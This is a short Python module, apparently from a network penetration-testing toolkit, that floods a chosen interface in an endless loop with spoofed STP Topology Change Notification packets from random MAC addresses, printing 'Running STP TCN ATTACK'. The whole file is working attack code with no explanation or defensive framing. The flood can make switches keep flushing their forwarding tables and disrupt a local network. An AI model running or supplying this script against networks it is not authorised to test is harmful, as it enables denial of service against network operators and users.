# -*- coding: utf-8 -*-

from scapy.layers.l2 import Ether, LLC, STP
from scapy.all import sendp, RandMAC
from termcolor import colored
import six

def run(inter):

    interface = str(inter[0])
    if len(interface) > 0:
        try:
            six.print_(colored("[*]", "blue"), "Running STP TCN ATTACK...")
            while 1:
                srcMAC = str(RandMAC())     # Random MAC in each iteration
                p_ether = Ether(dst="01:80:c2:00:00:00", src=srcMAC)
                p_llc = LLC()
                p_stp = STP(bpdutype=0x80)   # TCN packet
                pkt = p_ether/p_llc/p_stp   # STP packet structure

                sendp(pkt, iface=interface, verbose=0)

        except KeyboardInterrupt:
            pass


def run_attack(config):
    run(config.interface)